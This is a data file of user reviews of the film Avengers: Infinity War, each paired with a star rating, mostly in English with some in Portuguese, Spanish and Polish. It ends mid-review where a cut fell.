"An amazing movie, thanos' very own awesome movie, I love that it doesn't feel as standard action movie-y just amazing 9.9/10",5
The best visual effects ever made in a movie!,5
"Masterfully done. The sheer power and threat of Thanos is shown so perfectly throughout the film, up to and including the conclusion. A few opportunities were missed, such as several of the Children of Thanos being essentially just people with spears, or dying off far too early, especially ""Squidward"". The Wanda-Vision dynamic sets up some future films, but several of the characters have been known to make great sacrifices before (such as Tony), so sacrificing Vision should have been a more hotly debated option.",4.5
"One of the rare big-time blockbuster movies that wholeheartedly lives up to its hype, it perfectly balances the characters while furthering the story, deals great drama, comedy and some incredible action. The MCU Thanos is also now an iconic villain in his own right thanks to a stellar performance from Josh Brolin.",5
"could have been better if they excluded Wakanda, but pretty good",4
"Decent movie, not as good as the first one. Worth watching",3
better than endgame and is just thoroughly entertaining.,4
simplismente o melhor filme da historia,5
"While this is a movie that revolves around the villain and leaves audiences stunned in an uneasy way, it was executed flawlessly. I loved all of the characters together and their moments, especially how Thor, Doctor Strange, and even Quill were portrayed in the movie given their character roles. This is like the Empire Strikes Back of superhero movies in my opinion (alongside the Dark Knight). You'll see what I mean if you end up watching!",5
Part 1 of the greatest super hero movie of all time.,5
"The Russo Brothers strike yet again. This time, bringing to the live-action screen the best, without question, superhero team-up film of all-time. From the excellent CGI to the outstanding fight choreography, RDJ and company forged a film that will be remembered for generations to come.",5
One of the best movies of all time. Great ending for the Infinity Saga.,5
the movie is very good it's a big hit to create momentum for the end game it's a blockbuster it's great it's a great movie everyone should watch it it'll make everyone feel good it's awesome it's great,5
"My favourite Marvel film. Loved the pacing of the movie, the action sequences and story in general. Seeing the avengers lose was not expected but such a powerful moment.",5
UM DOS MELHORES FILMES QUE EU JA VI,5
"Esta sin duda es una verdadera joya, recuerdo la primera vez que la vi y lo atrapado que estaba en la historia sin querer parpadear en ningun segundo, se logra apreciar muy bien lo que marvel estaba planeando desde que inicio con su universo",5
It was so good. The whole plot with the twists and foreshadowed links to the other singular Marvel movies blow me away. And the the perfect cliffhanger ending leading up to Endgame. Amazing,5
"The thing about this movie is that there are so many characters and so many stories that are happening in different places, I don't want to end up writing way too much details. These movies are the only movies where I had to go and see it multiply times, and everytime a new one would come out i would sometimes watch all the movies in the whole MCU, I don't understand how can someone complain and give such a bad review yet they watched it multiple times and would watch the MCU just for this movie, if you going to go through all that and watch it over and over again than no matter its flaws or its story line, it definitely succeeded in its purpose. When I watched this at the theatre there was so many people of all ages and races just for this movie, this movie has brought a many people together no matter if they don't watch Marvel movies or even tried watch anything from the MCU. I still remember once going again with someone who hasn't watched any of these movies and that person actually told me how great and emotional it was. Sometimes we so built on nostalgia that we refuse to even admit something is as great as StarWars, Lord of the rings and even Harry Potter, because let's face it, The atmosphere I have experienced for Infinity war and End Game was far beyond greater than the experience I have had with The Last Jedi and Rise of Skywalker, during Infinity War I have heard gasps, shocks and laughs far more emotion than the TLJ and Skywalker, especially by the ending. This movie is actually an event because onthis movie is actually an event because one thing happen after another, before we can process one thing another thing happens. The cinematography is actually one for he best, you see so many planets and it really feels so surreal each planet, the colours really envisions the comics. There is so much details you can see like the stitching in the costumes, the marks on the faces like Thanos, who is Cgi yet you see a the pores in his face, and you can see the scars in Doctors Strange's hand. The spectacles that is in the air can been be visible, that was on thing that added such an atmosphere when I saw it on 3D IMAX, even watching it now, the sceneries is just amazing. This movie score is so underappreciated, the score literally not just fit the scene but the action that was happening in the scenes. The sound effects is absolutely amazing, especially with the first time they came in New York, the sound made that scene seem so real and when Thanos arrived at Wakanda, the sound made my heart beat in anticipation. The best way to watch this is with a surround sound system because you would want to hear everything. How do you think I will rate this movies? Do you think I will give it a low rating after Loki's death shocked me? When moment Bruce saw Tony after years it made me so happy, when Gamora was sacrificed I was so sad, when Captain America and Thor arrived I cheered, when Starlord ruined everything I was literally angry, and when all blimped I was in shock especially with Peter Parker...this movie is emotionally impactinge thing happen after another, before we can process one thing another thing happens.

Melhor filme Marvel at√© hoje. Top top top,5
"The jewel in the crown. A decade of storytelling, 'an entire universe, once and for all'. A war movie that moves like a bullet. Characters and dialogue are utilised with great utility. Phenomenal set pieces and incredible character interactions. A very worthy antagonist. Alan Silvestri's score in this movie is something else! Fantastic performances by all, with special mention being given to Robert Downey Jr and Elizabeth Olsen. I adore this film.",4

"Amazing, The best marvel's movie",5
Esse filme e perfeito,5
I see this movie as an absolute well made masterpiece. It's still to this day my personal favorite MCU film.,5
For the first time it feels as if there is emotional weight and real stakes behind a film in the MCU. Focusing on the compelling rise of Thanos is a welcome deviation from the standard Marvel template.,4
Best film marvel has ever produced,5
"In my opinion this film is the best of the Avengers,the Russo brothers did a great job on the film,they could include all of the ucm heroes that appear before Infinity war(and it was a lot).The end of the film was very intriguing for everybody that watched the film. And was very cool how they could put all off the informations that the film will need .The cast of the film is really good too,the actresses did awesome job ________________________________________________ Avengers I like this movie because of the graphics, the editing ,the acting of the characters and in my opinion is one of the greatest movies in decades.",5
"It's an avenger's movie that, regardless of the negatives is a must-watch. However; Thor spends the entirety of ragnarok's run-time figuring out that he isn't the ""God of hammers"", but that he is the ""God of lightning"", just for Thor to spend 95% of Avenger's run-time trying to find a weapon so he can be the ""God of Stormbreaker"" I guess. Nice way to waste hours of character development for Thor. Not to mention Starlord throwing the plan by getting his feelings in the way- when you write a situation like that, i think you need to work on your writing skills a little more because it was frustrating as a viewer to watch. these two points alone make this movie slightly painful to watch, but as I said it's an Avenger's movie so, it deserves the watch cause it's fun anyways and good enough.",4.5
The best Marvel movie ever made!,5
Two and half hours of nothing just so they can trick you into having to watch another 3 hour movie. The only thing epic about this is the studios money grab.,1

"mid too much happened and little to no story telling the cgi was trash and the cinematogropy could have been done better by a blind orphan, get the hell out 1.5/5",1.5
"One of, if not the best Marvel movie to date with an incredible production design and visual effects. The cast is phenomenal with Downey Jr., Hemsworth, Brolin, Olsen and Pratt as standouts. The scale of this movie is so epic and exciting.",4.5
"Arguably the Russo Brothers' masterpiece, Avengers: Infinity War finally shows how awesome Thanos is with him surely showing his status as the greatest MCU villain to date and a spectacular performance by Josh Brolin, the rest of the film is pure Marvel magic: excellent performances, incredible humor, wonderful action sequences, a lot of emotional moments, plus bringing every iconic MCU hero on screen at the same time against a gigantic threath, this movie virtually has no flaws and is amongst the greatest movies ever made.",5
This is arguably one of the greatest movies of all time. I will forever remember leaving the theater with a feeling of wonder after watching this.,5
The CGI is on another level,5
"I loved everything this movie does, everytime I watch it I find myself crying, but enjoying every moment, the Action, the comedy, the drama, the pacing, everything in this movie is outstanding",4.5
"By now, you probably either love Marvel movies or you hate them. If what you are looking for is snappy dialogue, splashy scenes and an abundance of CGI battles, then this may be the best of the bunch. For me, as only a casual fan, I could appreciate the filmmakers giving it their all, yet found myself fatigued by all the eye-numbing action by the end. Props for raising the stakes with the finger snap at the end.",3.5

it is a good first part of the end of infinity saga the villian its like unstoppable force and characters can rip themselfs apart to defeat him the actors are really tying theyre best and josh brolin as thanos is amazing one of the best vilains we got to see in the last 10 years.,4.5
The best movie of all time with the best villain of all time!!!!,5
"The fact that this movie has a 85% is outrageous, not only is it outrageous for being the greatest crossover/interconnective movie of all time but the plot, story, action, music, acting, villain, comedy, and ending are all perfect and tragic. It's deaths have meaning in the moment they set Thanos up to be the greatest villain of all time and It does not fail. Almost ever character has their best look/suit in this movie and it's perfect in everyway.",5

Russo bros perfectly bring together several different characters (and their stories) and introduces the most dangerous villain in the MCU with great vigor.,5
GREATEST SUPERHERO MOVIE EVER!!!!!.... and i have many Favorites,5
Avengers Infinity War as of 9/9/22 is still the best MCU movie to date everything in the Infinity Saga has been building up to this & while we did have some missteps it was worth the wait. But that doesn't mean this film is perfect their are some problems their are too many jokes in the movie you have a joke like every 5 minutes which begins to get annoying I also didn't like how Captain America wasn't in the movie that much besides that cool entrance he gets when he runs into Wanda & Vision he doesn't really do anything. Now that's all the complaints I have now to get onto the good stuff. This film features every character we have met up to this point that's including both faction which are The Avengers & The Guardians Of The Galaxy seeing these characters all meet for the first time & interact is exciting. Thanos is the best character in the movie & to this day he is still the best MCU villain not just because he is a super strong obstacle our heroes must defeat but because his motivations & philosophy can be seen as a good thing sure the way he does things are bad but he is doing it to make the universe better which can make some see him as a anti hero instead of a full on villain. And finally let me discuss the amazing ending this film has something the other films were missing which are stakes usually when you watch a MCU movie you can easily relax since the heroes will defeat the villain around the final act & no one will die in the movie but here you can't expect that because Thanos wins & half of our heroes get erased from existence it's a beautiful scene where their is nothing to distract us from the horror we are witnessing our heroes are defeated scattered across the galaxy & to add the cherry on top it ends with Thanos smiling which is a reference to the comic where the ending was different in the comic he is smiling because he lost where here he is smiling that he accomplished his mission with the end credits just being a simple black screen with text no flashy post credit scene to pull us out of the experience like in all the other MCU movies.,4.5
"Ten film to mokry sen ka≈ºdego fana, akacja pƒôdzie jak b≈Çyskawica podkrƒôcana przez epickƒÖ muzykƒô, na taki fina≈Ç wszyscy czekali!",5
A quintessential avengers movie,4
"Seven words, CURRENTLY: The best MCU Film of ALL TIME!",5
"If this isn't the best MCU film then it's damn close. Marvel had been building to this moment for years, weaving characters and movies toward Thanos' grand gambit, and this movie brings it all to life. I loved the action, dialogue, and character team ups. Sure, the cgi is a bit too much at times, but other than that this is the pinnacle of MCU films.",5
I watched it mainly for its Visual Effects. It's nice to watch. I watched it long time ago. I don't remember many details.,5
Really well-done movie in all facets except the vision arc. Why would he be outside in the open. Why would she do what she did if they knew bit purple had the time stone. Lazy writing and story telling.,5
"From the beginning, you could tell that this one was special. The audience was hooked from then all the way until the climax to end all climaxes. Infinity War redefined the superhero genre, and everything in this movie works perfectly. From the fast-paced story to the high-stakes action, all tied together with what is probably the greatest on-screen villain of all time. 10/10",5
"In hindsight, I liked this way more than End Game. Very Empire Strikes Back-esque in terms of the good guys not really winning and things getting super interesting.",4.5
"Uma obra maravilhosa, repleta de personagens interessantes e carism√°ticos, as cenas deste filme s√£o muito bem executadas tanto em dire√ß√£o, quanto em atua√ß√£o e CGI. As poucas cenas ruins n√£o desmerecem a obra como um todo.",4.5
"The best of all the Marvel flicks! The absolute pinnacle of the superhero film era. It brought together everything that came before it perfectly, with a huge payoff from the stellar cast and unparalleled cinematography.",5
This movie is unexpecting and it was disappointing. The plot was messy.,1.5
"One of the coolest, epic, action packed movies of all time!!! All of these amazing heroes interacting trying to defeat the greatest comic book villian of all time Thanos!",5
one of the best Movie,5
Fantastic movie all around. Vision being taken down so easily was a disappointment. Shuri mocking Tony and Bruce about not being smart enough to think of something was a cheap shot that was unneeded.,4.5
This will be a classic for fans of Marvel for decades to come. Marvel at its best.,5
"Seriously good movie despite turning Hulk into a bit of a coward. They (the Russo's) did deviate a little bit from the source material but in the end it works, for the most part.",4
La mejor del MCU. Thanos es incre√≠ble. Este Thor si que vale la pena.,5
"Avengers Infinity War in my opinion is a masterpiece, not only among marvel films but in modern cinema. It is perfect from almost every point of view: the action tone does not let you breathe for a moment, the plot and editing are well constructed with all the various stories that intertwine, the characters give their best, the direction is extraordinary, the dialogues are memorable, the soundtrack is great and fits perfectly in any scene, the photography is very good, the locations are beautiful. Finally the villain ... Thanos is the best villain in the whole MCU as he is ambitious, wise but at the same time crazy, he is a very skilled and strong warrior who has managed to face the Avengers and complete his plan to collect the six Infinity Stones to wipe out half of life in the universe. In conclusion, this film is a marvel masterpiece that is the pinnacle of everything previously seen in the MCU.",5
i like it and was fun to watch.,4
"It's a different movie from what Marvel normally makes, this one is focused on the villain, and there's always a lot of emotion throughout the whole movie and for me one of the best endings that ever existed, it's in my opinion the best Marvel movie.",5
The best movie of the time. One of my favourites. I love MCU.,5
My second favourite movie of all time!!!!!!!! Only to Endgame,5
Best Marvel movie by a long mile,5
Hell yeah finally the main villain of MCU just appearance and the movie has lot of great fighting scene the thor appearance on Wakanda was FIRE! 10/10,5
Too much going on and it did not live up to the hype!,1
This was the best MCU movie to day. action packed and kept me on the edge of my seat. when I left the theater felt like i got off a roller coaster,5
some reason i liked this more than endgame idk. maybe i love thanos,5
"Without a doubt the single best MCU movie of all time. A great movie with some great moments, and the ending was unexpected to some people. Although many people knew they would snap back the other characters, I think the ending worked for me, and it was emotional, dreadful and ended on a hopeless note. It's one of the most mature films in the MCU, and definitely a prequel done so well, I barely have any complaints to this movie. Infinity War Rating: A+ An all time prequel, with a great plot and script.",5
"Beautiful, grandiose movie, the movie every fan expected to see the meeting of the greatest heroes of the land, an overwhelming, imposing captain america (too bad he was without his traditional shield, for obvious reasons) the best version of Thor, in the other movies Thor is the same as nothing, a joke... The movie has a very good war feel, even though it's kind of clich√© in the Marvel style... but it's very good, I was shocked at the end, I didn't expect that marvel would have the courage to kill the characters (even knowing they would come back) 9.5/10 I just don't give 10 because this marvel habit of being afraid of putting violent scenes is very annoying",4.5
Best Marvel movie of all time.,5
"One of the most, if not, the best MCU movie made up to this point (Maybe spidy 3). The Filmmakers also including the directors, THE RUSSO BROS., the screenwriters, Christopher Markus and Stephen Mcfeely, and the president and producer of the Marvel Studios itself, KEVIN FEIGE, all collectively happend to be my favorites, did an effective collaberation on this mind blowing event with balancing the astonishing characters from taking them out of the toy box and into the sand box against an influencial and philosophical protagonist.",5
"It never seemed as surprising or shocking to me as everyone else, but it is certainly a great movie with an uncomfortable narrative, great action, a great villain and it makes our effort worth following all the MCU movies.",4
Beautiful build-up to the epic finale of this Infinity saga,5
Yeah. It's really THAT good.,5
My rating for the film is a 8.7/10,4
"Perfeito! Dramaturgia, personagens, a√ß√£o, humor na medida e um final memor√°vel!",5
"Was amazing!! Thanos was so intimidating, ruthless.",5
"The best MCU movie and my favorite comic book movie. Everything works well here. They packed so much into one movie and the ending is always heart wrenching, Josh Brolin's Thanos just steals the show, though. This is Thanos's movie and the emotional climax makes this movie.",5
"Absolutely captivating. It has thrilling action, great acting, and will not disappoint. A must see.",5
"This movie really built an amazing story with substance, using less honour compared to other Marvel films (the honour is still there). The villain Thanos is what gives this movie an amazing feel building him as someone dangerous, but we see what he's doing is to try to help the universe not take it over giving us one of the best supervillain stories up there with Joker. But the ending is what makes this movie, we see Thanos win killing half the universe including a lot of the heroes. This gives an Empire Strikes Back type ending of having the heroes lose really badly and having to retreat.",5
"This is absolutely the best Avengers movie. The story with Thanos was incredible and serious, but it also was very funny. The comedy by may of the actors is what really sells this movie as great. I also loved how there were many main characters and they all got the right amount of screentime without things being feeling overboard.",5
I wholeheartedly believe that this is the best movie in the mcu. Infinity War is so much fun to watch and I love all of the characters in this movie. The story of this movie and the motivations on Thanos are very understandable and compelling. Even though this movie has a lot of jokes it is perfectly balanced out with the emotional and heartbreaking scenes in the movie. The best mcu movie indeed.,5
"Why is this movie so good?? This movie should not be better than Endgame but it is, IN EVERY WAY!",5
Peak of the MCU!!! A great villain along with my favorites heroes gave me such thrill ride I was hoping for. A movie where the villain wins. Got me hyped for the finish I wanted from marvel.,4.5
My favorite Avengers movie,5
"The one masterpiece of the MCU. 10 years of build up pays off in a bold epic way. The best of the best. Best villain, best writing of the series.",5
Does everything so well that I don‚Äôt need to say much about it. Only problem is the typical Marvel one where the large scale fights lack a bit of tension but that problem is much less prevalent in this one than others as the most memorable fights are ones where it‚Äôs just the main heroes vs Thanos on his own. This movie ‚Äúsubverts expectations ü§ì‚Äù really well and in a way that makes sense and fits the story. 9.5/10,4.5
"One of Marvel's best movies, Avengers: Infinity War is an epic blockbuster in the truest sense of the words. To see all of these Marvel heroes on-screen together is truly satisfying, and seeing how they all interact is exciting and humorous. The stakes are higher than any other MCU film to date, and the ending is shocking, emotional, and absolutely awesome. The final battle leading up to it is one of Marvel's finest, with so many earned, satisfying moments. Infinity War's only flaw is that the camera work takes little risks, and I wish they could have used some expressive shots. But that's such a small issue (more of a nitpick really), that it's almost not worth typing. Combined with Marvel's best and most compelling villain, Thanos, Infinity War is one of my favorite, and one of the best, MCU movies.",5
"Yeah, this is better than CATS.",4.5
One of the best Marvel films hands down,5
An excellent night at the pictures!,4
"A fantastic movie with everything you could ask for and more! Great story which was built up over the years, plus the greatest villian in MCU history, this is as good as it gets brilliant",5
I personally love it,5
The road finally reached Its destination with 70% Russo Bros and 30% Marvel.,4.5
Thanos was just simply amazing. The action was intense. The ending had me in awe.,5
"The peak of marvel movies, the end is one of the best finale I have ever watched.",5
Best marvel movie with great action,5
"My favorite Avengers movie! Avengers:Infinity war is one of those rare spectacle that is heart moving and also heart breaking while still managing to fan service the mcu fans.For me the reasons why I enjoyed infinity war more than endgame are the twist and the ending.Honestly not everybody expected almost all of our beloved heroes dying so helplessly and the end scene where tanos just smiles and looks around with pride and with the sense of great achievement and that awesome emotional music, it is to me the best ending in the mcu simply because it was unprecedented. Tanos was teased for six years and I'm glad it paid off.From funny one liners to emotional sacrifices, Avengers:infinty war is a wonderful movie that was ten years in the making.The actors and actresses, every single one of them did justice to their characters which made this movie all the same better. So I think this movie deserves your attention,your review and ratings.Yes this movie deserves ""EVERYTHING"".",5
great to see all the superheroes together with one single goal,5
"Infinity War is a movie who knew how to take advantage of the basics of a story beginning, middle and end. This movie has a end in which Thanos defeat the heros, using the snap, but for me this movie just doesn't have a rating higher than 4.5 because it is divided in groups that are all in diferent situations we have Wakanda group, Iron man group and for me this dosen¬¥t do sense because Iron Man group could be on Earth or in the space and the movie will sitll being the same but in general the movie is SO GOOD and i like it so mutch",4.5
"My favorite avengers movie, plot is really good and same with the acting, really interesting",4.5
"In my opinion, they kind of copied the plot for this movie from Age Of Ultron, but then with Thanos instead of Ultron. It was too much alike. But even so, Infinity War is still a very good movie, and a Must See!",4
"Truly a darker turn for the future of the MCU in the end, but an intriguing one as well, as the film is filled with stunning visuals and storylines that pits the Avengers against Thanos in a battle unlike anything we've seen on the screen thus far.",4.5
One of the best movies ive ever seen,5
Great movie wasn‚Äôt my favorite avengers movie but it was still really good the action and plot was perfect overall 9.2/10,4.5
One of the best marvel movies to be released,5
The movie that change the course of the 2020 decade and on. Brilliant. Deserves every award possible.,5
After a decade of build up we finally get the Mcu movie we have been waiting for.,5
"Brings together 10 years worth of storytelling and character development into a cohesive, fast paced and entertaining masterpiece that never fails to pull at the heartstrings. #1 film in the entire MCU in my honest opinion.",5
Speechless after seeing this. A decade in the making!,5
"This is a frustrating one for me. I absolutely love the villain but there is just way too much going on. It tries to do way too much and it's trying to blind us from the dull storyline with all the action. Most people do enjoy it, but this one isn't really for me",3
Nice springboard to next movie,4
"It's good that Thanos wins, and the fact that Thanos is a great villain, but the rest is the same old super hero crap. It's the same as any of the Marvel movies.",3
Great build up for End Game,4
- Story: 10 - Acting: 10 - Visual: 10 - Sound: 10,5
"Heroes from all side of the universe that we have watched since 2008, fighting againts the final boss of the Avengers, unfortunatly as the comics said in infinity war: The end begins here, sadly the phase 4 after this movies is bad compared to this phases before.",5
"Very interesting plot, a lot of action, great performance and the end is very surprising but interesting. The fight scenes are very good, even if they could be better without the unnecessary amount of jokes and catchphrases added between punches. The villain, Thanos, is a very good one, well written and believable.",5
Shoulda aimed for the head!,5
"Boring, kiddie movie, just like the rest of the MCU. Too many bad jokes, and bad acting.",0.5
awesome Marvel movie. a total package of comedy & action.,5
"it ends in chaos, bu it is worth it",4.5
"This is a perfect movie with lots of iconic moments, action, and humor. Every character in this movie is amazing, and the ending made every person gasp in disbelief and shock. Definitely among the top of the MCU movies.",5
"Incredible action and CGI, no doubt the greatest Avengers movie, a true Marvel spectacle.",5
Amazing ! üíñ .. Goose Bumps ! üíñ ..,5
Best movie OAT! 10/10!,5
"A culmination of 18 MCU movies that mastered the idea of set-up and payoff. This movie is loud, brash, and full of chaotic CGI extravaganza that Marvel is known for. However, it has thoughtful moments and thematic ideas that were explored really well. The greatest thing about this movie is the ending. It was so powerful that it made the audiences shocked, and that was a chef's kiss moment!",5
"Say what you will about Avengers Endgame, but for my money's worth, Avengers Infinity War is the only MCU movie that I consider perfect! From anticipation, to pay off, to legacy, I still get chills, cry, and laugh at every moment that I got chills, cried, and laughed at the first time I saw it. The acting and chemistry is incredible, the characters and the way the story balances them is unbelievable, the effects are mind-blowing, the action is creative, the score is beautiful, and the story feels gigantic! I can't think of a single flaw in this film that isn't toppled over by the weight of just how much awesomeness resides within this movie! It is a true modern day epic, and the best that I believe the MCU has ever released and probably will ever release!",5
Best movie of all time üî•,5
best marvel movie in my opinion,5
"Roller coaster ride. All over the map, in plot and characters (too many), but a ton of fun to watch.",3.5
this generation's citizen kane,5
Is there such a good movie seriously I thought these movies were just a myth but here it is. I will not give spoilers just saying that every movie fan should watch it.,5
Favorite movie all time‚Ä¶ Words can‚Äôt explain how much I enjoyed this movie,5
o melhor filme de 2018 sem duvidas,5
"Without a doubt, Avengers: Infinity War is one of the greatest films in cinematic history. Josh Brolin provides a multifaceted performance as Thanos. He may be the villain, but you can see his conviction, sadness, cruelty, and surprising humility in his face. He is the main character. So, this is pretty much a Thanos movie. Thanos is almost like a twisted monk in that he truly believes that he is going to save the universe through his actions. But he is truly a walking conundrum, for he desired to save the universe by destroying half of its population. I understand that he was motivated by his trauma of losing his homeworld, but it's strange how he is compassionate on a collective level, but very callous and imperious in terms of his interactions with others. So, definitely one of Brolin's best performances. Otherwise, my favorite characters in the film were Gamora, Dr. Strange, Wanda Maximoff, and Peter Parker. It's a movie that both entertains you and makes you think. One of the best MCU stories released.",5
Esse filme foi perfeito!!!,5
Number 1 on my MCU films. a rollercoaster of emotions. Thor's entrance into Wakanda may be my favorite MCU moment.,5
"Great movies, marvel managed to do everything a superhero movie should have, epic action scenes, an interesting story, amazing special effects, and a big villain. And the brain blasting ending was the icing on the cake",5
Inconsistent with it's own rules (Bruce Banner remembering things Hulk should only know). Full of cliches such as the villain leaving the hero tied up instead of killing him (Thanos and Thor at the beginning). Peter Dinklage was a terrible miscast. Hulk and Vision really nerfed.,3
This movie is the ‚ÄòEmpire Strikes Back‚Äô of the Marvel Cinematic Universe.,5
"This movie is perfect. Perfect balance of the multiple storylines that come together, perfect portrayal of the consequences of previous movies (Civil War, Steve and Tony not having a frame of shared screen time), and an unconventional way of storytelling, making the villain the true main character of the film. This is a fun masterpiece with stakes that I find no issues with at all.",5
Cried at the cinema. This movie made me less of a man,5
"A movie, what the heck is a movie. This certainly isn't I don't know what this is or isn't. My cinematic father David foster Wallace would certainly not approve it's too facile for a big brain intellectual such as myself. I don't want to dig out my old collection of comic books for this film. It's too lurid and uninteresting for a genius such as myself.",3.5
"Though definitely a Part One, this movie is incredibly enjoyable. However, I need to say that the outcome of the movie would be virtually the same if the Avengers just let Thanos get the stones to begin with. Rating - Great",4.5
best mcu movie easily.,5
Best MCU movie I have ever seen. Thanos'S motivation is clear throughout the movie big suprise actually seeing him win.,5
This movie is a must-see. It's full of action and plot twists and slight moments of humor here and there. The ending was the perfect setup for the second movie. The acting quality was amazing due to the number of experienced actors. The whole movie was just perfection.,5
"Thanos is built into a very interesting character, has lots of good moments and is much more manageable compared to the likes of Endgame and its Back future copies. Overall nearly at the masterpiece mark but enjoyable.",4
"Infinity War is neither a great film noir an extremely increidble experience, but it works both as a good film and a good experience.",4
"The film is amazing. The Marvel Cinematic Universe has created a cinematic event in which all the characters from their films unite into one amazing film in which Thanos, the villain of the film searches for the Infinity Stones to erase half of the universe for the other half to flourish. An extraordinary film and the best I have seen so far.",5
"Finally, we are introduced to the end of the Infinity Saga and it feels the way it should: emotion and nostalgia.",5
One of the most menacing moments in cinema goes to this movie. The Russo brothers like to play with fire.,5
"Just like Deathly Hollows and Mockingjay, only both parts are worth seeing",4.5
Weird . Everybody played their cards dumb .,1
Even though the shocking ending is somewhat neutered due to all the pre announced movie sequels for most of the characters. This was still a very fun ride. Thanos definitely delivers as the big bad of the MCU universe.,5
A well written movie,5
amazing movie made me cry in the cinema,5
A great Marvel movie. Well done!,4
Probably the last Marvel movies I saw that actually hooked me. It was a massive undertaking and they stuck the landing perfectly.,4.5
"The most dramatic film of the saga but it has all the tricks up its sleeve to be a blockbuster film. With mind-blowing combat, dramatic dialogue, fun and unexpected twists, Avengers: Infinity War is one of the most famous and beloved films ever",4
Avengers: Infinity War is one of the best marvel movies of all time that's also super entertaining with a heart breaking ending!,5
"Certainly one of the few crowd pleasing blockbusters where the villain wins in the end, Infinity War has one epic scene after another. I would argue this is the best 1st Act in any superhero film.",4
The Greatest Movie of All Time,5
"Simplesmente o melhor Live Action de her√≥is, transborda de emo√ß√£o, a√ß√£o e trabalha os diversos focos com maestria, √© simplesmente cinema. Nota: 100% üçÖ",5
"My favourite out of all the Avengers films, dark, & depressing toward the end, a refreshing change.",4.5
"N√£o superou minhas espectativas, achei que o filme andava de forma meio lenta, mas em geral √© bom, nada mais",4
Top 5 Best comic book movie ever! And team up movie.,5
"LEGAL DEMAIS, MUITO BOM MESMO!",5
The best Avengers film ever and love how to was able to utilize all the characters while not giving the spotlight on just one character as much as it is centered on Thanos plan for universe destruction,5
Heartbreaking and Breathtaking. Infinity War freaks the audience out and creates theories that make people want to question what will happen next or what may happen on who either lives or dies.,5
"Muito bom, a sua continua√ß√£o √© melhor (ultimato) mas deixa o mist√©rio no ar de (hj em dia) como existe Wanda vision, Dr estranho 2, homem aranha 2 e 3... e s√≥ √© revelado em ultimato",4.5
"Intense, thrilling, emotional, action-packed, brilliantly scripted and executed with a shock ending - truly one of the greatest films of all time!",5
greatest battle of the mcu right after nwh,5
Ons of the darkest MCU Movies but thats a good thing but also one of the best,5
second greatest movie of all time,5
Probably one of the best Marvel movies out there. I loved getting to see all the charaters in one movie and I liked seeing them work together. It had all emotions in one and hooked me from the start to the beginning.,4.5
"i change my mind about this movie its not perfect but still great but not perfect i watched a video by carlin brothers about doctor strange and i don't like doctor strange he lied to tony about what happened and makes no sense its just him that brings this movie down.but the rest of it is amazing honesty with great action,great,cast,and a awesome villain he's amazing thanos man he looked a like a boring villain atfirst but he's amazing.this movie is 8/10 awesome!",4
"Not quite top tier MCU, but very close. This is the second best crossover ever on screen, after the first Avengers. The film manages to balance so many characters and plotlines perfectly. Yes, there are some flaws like the sheer amount of storylines audiences must keep up with at once and *SPOILERS* Gamora'a fridging *END OF SPOILERS* But overall this is such a fun experience, and the Russo Bros's best directorial work yet.",4
"O MEU FILME FAVORITO DA MARVEL. Esse filme √© um dos maiores acontecimentos cinematogr√°ficos da Marvel e do cinema em si. Junta muitos personagens e herois, que as pessoas esperaram anos para verem eles lutando lado a lado. A imagem √© maravilhosa e os cen√°rios incriveis. Esse filme s√≥ n√£o me agrada em uma coisa. Eles n√£o lutam todos juntos. Enquanto uns est√£o em Wakanda, outros em Nova Iorque (cena p√≥s-creditos) e outros no espa√ßo, literalmente noutro mundo. Acho esse filme maravilhoso.",5
"After all these years and all these MCU movies, things are finally starting to pay off. Thanos is a character that audiences can't help but be interested in. Unfortunately, the movie feels very disjointed. Because there's so many characters, it can be awhile before we check in on a character we had earlier in the movie. That's not necessarily an issue in itself, but sometimes their actions are forgettable, so you have to remind yourself what they're even doing. There's a big focus on the Guardians of the Galaxy which I like, but they definitely get a lot of screen time compared to other Avenger veterans. Tom Holland and RDJ have great chemistry. Their characters work very well together. CGI can he kind of hit or miss depending on the scene. All-in-all, this is a very good movie that is leading to a heart-stopping conclusion, and I would definitely recommend this movie to others.",3.5
3 hours long and still not long enough... Thanos is my Hero. Delivers in every way!,5
One of the best comic book movies made. Amazing visually and very compelling villain.,5
"Everything you could ask for as a fan. It is an action packed movie with tons of iconic scenes. If you take the time to watch the rest of the mcu movies beforehand, this is one of the greatest movies of all time",5
"The ending was a refreshing spin on the comic book genre but the film still repeats the same mold as every other Marvel film. Over the top CGI scenes with witty, comical dialog that us supposed to be hip. You've seen one Marvel film, you have seen them all.",3
"The perfect dramatic yet dark end, building up to the great finale.",5
"In my very own opinion, one of the best movies ever made. Thanos is a FANTASTIC villain he's so complex and interesting as character. And its a MIRACLE that this movie didn't suck, you know, balancing the 30 characters in one movie? Yeah, sounds pretty hard. This is a wonderful movie. It's a must watch.",5
One of the best comic book movies ever made. The ending was perfect and set up the sequel in the perfect way possible.,4
A+ ~ The best Avengers movie and arguable the best Marvel movie. It was nonstop action from beginning to end and one of the best experiences for a fan who has been watching since the beginning.,5
"Thanos is great. Wtf all those superheroes do? Idiot Star-Lord. Useless Wanda and Vision, wondering have that superpower but do nothing.",3
A quintessential avengers movie,4
rip everyone. gg thanos,5
"Amazing, of course, but still not perfect, Marvel! Maybe too much action and explosions in this movie. I would have enjoyed it even more if they had focused much more on the plot and the development of characters. As far as I am concerned, it is a great movie, but.. too much of everything maybe sound confusing!",4
"Have found myself liking or loving a lot of Marvel's previous work, while finding a few faults with most. It is very easy on the most part to see why they are highly regarded critically, though those more critical of their work have raised criticisms that can be agreed with by me. Loved the first 'Avengers' film, while 'Age of Ultron' was more problematic and generally a lesser Marvel effort though still having a good deal to admire. 'Infinity War' for me was the best one, or the one enjoyed most. Would also go far to say it's one of Marvel's overall best, and a perfect example of how to do a superhero film and how to balance a large cast of characters and a lot going on. Can totally see why it has been so positively reviewed and it deserves the positive hype from personal opinion, though would hesitate in calling it flawless or one of the best films ever. More could have been done with the very end, which felt like it ended a little too suddenly without resolving everything to full effect. It may very well have been leaving room for a follow-up, but to me it's always been dangerous somewhat to do that just in case a follow-up doesn't happen. Scarlett Johansson also has far too little to do, with too short screen-time. Black Widow is the only character to me who felt underdeveloped and Johansson struggles to do much with it. However, the rest of the cast are spot on. A big shout out goes to Josh Brolin, who makes for a menacing and melancholic Thanos. Speaking of Thanos, Marvel have tended to underwhelm with their villains, underwriting them and giving them vague or inconsistent motivations. Thanos is easily one of the best Marvel villains along with Hela, one of the most interesting and of surprising complexity where he is a threat but one can see his point of view. Robert Downey Jnr, Chris Evans and Chris Hemsworth are also standouts of a near-uniformly great all-star cast. There are a lot of characters here, but somehow on the most part it didn't feel like there were too many (a big danger with films with many characters and a trap fallen into quite a lot). They hold a lot of 